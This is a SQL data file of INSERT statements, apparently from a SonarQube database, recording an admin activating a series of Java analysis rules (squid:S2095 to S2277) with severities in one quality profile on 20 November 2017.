INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1894, '2017-11-20 11:09:26.315', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlurbbGRdfPp-q7J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1895, '2017-11-20 11:09:26.344', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlvIbbGRdfPp-q7K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1896, '2017-11-20 11:09:26.382', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlvubbGRdfPp-q7L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1897, '2017-11-20 11:09:26.422', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlwWbbGRdfPp-q7M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1898, '2017-11-20 11:09:26.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlxAbbGRdfPp-q7N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1899, '2017-11-20 11:09:26.502', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlxmbbGRdfPp-q7O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1900, '2017-11-20 11:09:26.541', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlyNbbGRdfPp-q7P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1901, '2017-11-20 11:09:26.584', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHly4bbGRdfPp-q7Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1902, '2017-11-20 11:09:26.621', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlzdbbGRdfPp-q7R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1903, '2017-11-20 11:09:26.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl0EbbGRdfPp-q7S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1904, '2017-11-20 11:09:26.695', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl0nbbGRdfPp-q7T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1905, '2017-11-20 11:09:26.736', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl1QbbGRdfPp-q7U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1906, '2017-11-20 11:09:26.775', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl13bbGRdfPp-q7V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1907, '2017-11-20 11:09:26.816', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl2gbbGRdfPp-q7W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1908, '2017-11-20 11:09:26.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl3SbbGRdfPp-q7X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1909, '2017-11-20 11:09:26.92', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl4IbbGRdfPp-q7Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1910, '2017-11-20 11:09:27.011', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl5jbbGRdfPp-q7Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1911, '2017-11-20 11:09:27.048', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl6IbbGRdfPp-q7a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1912, '2017-11-20 11:09:27.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl7bbbGRdfPp-q7b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1913, '2017-11-20 11:09:27.19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl8WbbGRdfPp-q7c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1914, '2017-11-20 11:09:27.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl88bbGRdfPp-q7d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1915, '2017-11-20 11:09:27.278', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl9ubbGRdfPp-q7e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1916, '2017-11-20 11:09:27.325', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl-dbbGRdfPp-q7f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1917, '2017-11-20 11:09:27.375', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl_PbbGRdfPp-q7g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1918, '2017-11-20 11:09:27.414', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHl_2bbGRdfPp-q7h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1919, '2017-11-20 11:09:27.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmAUbbGRdfPp-q7i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1920, '2017-11-20 11:09:27.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmA3bbGRdfPp-q7j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1921, '2017-11-20 11:09:27.516', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmBcbbGRdfPp-q7k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1922, '2017-11-20 11:09:27.555', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmCDbbGRdfPp-q7l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1923, '2017-11-20 11:09:27.595', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmCrbbGRdfPp-q7m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1924, '2017-11-20 11:09:27.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmDUbbGRdfPp-q7n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1925, '2017-11-20 11:09:27.673', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmD5bbGRdfPp-q7o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1926, '2017-11-20 11:09:27.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmEjbbGRdfPp-q7p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1927, '2017-11-20 11:09:27.753', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmFJbbGRdfPp-q7q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1928, '2017-11-20 11:09:27.799', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmF3bbGRdfPp-q7r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1929, '2017-11-20 11:09:27.875', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmHDbbGRdfPp-q7s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1930, '2017-11-20 11:09:27.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmH_bbGRdfPp-q7t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1931, '2017-11-20 11:09:28', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmJAbbGRdfPp-q7u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1932, '2017-11-20 11:09:28.102', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmKmbbGRdfPp-q7v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1933, '2017-11-20 11:09:28.161', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmLhbbGRdfPp-q7w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1934, '2017-11-20 11:09:28.206', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmMObbGRdfPp-q7x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1935, '2017-11-20 11:09:28.247', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmM3bbGRdfPp-q7y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1936, '2017-11-20 11:09:28.28', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmNYbbGRdfPp-q7z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1937, '2017-11-20 11:09:28.307', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmNzbbGRdfPp-q70');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1938, '2017-11-20 11:09:28.328', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmOIbbGRdfPp-q71');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1939, '2017-11-20 11:09:28.355', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmOjbbGRdfPp-q72');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1940, '2017-11-20 11:09:28.384', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmPAbbGRdfPp-q73');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1941, '2017-11-20 11:09:28.413', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmPdbbGRdfPp-q74');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1942, '2017-11-20 11:09:28.432', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmPwbbGRdfPp-q75');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1943, '2017-11-20 11:09:28.473', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmQZbbGRdfPp-q76');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1944, '2017-11-20 11:09:28.503', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmQ3bbGRdfPp-q77');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1945, '2017-11-20 11:09:28.522', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmRKbbGRdfPp-q78');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1946, '2017-11-20 11:09:28.546', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmRibbGRdfPp-q79');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1947, '2017-11-20 11:09:28.578', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmSCbbGRdfPp-q7-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1948, '2017-11-20 11:09:28.61', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmSibbGRdfPp-q7_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1949, '2017-11-20 11:09:28.637', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmS9bbGRdfPp-q8A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1950, '2017-11-20 11:09:28.665', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmTZbbGRdfPp-q8B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1951, '2017-11-20 11:09:28.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmT1bbGRdfPp-q8C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1952, '2017-11-20 11:09:28.72', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmUQbbGRdfPp-q8D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1953, '2017-11-20 11:09:28.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmUwbbGRdfPp-q8E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1954, '2017-11-20 11:09:28.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmVEbbGRdfPp-q8F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1955, '2017-11-20 11:09:28.802', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHmVibbGRdfPp-q8G');
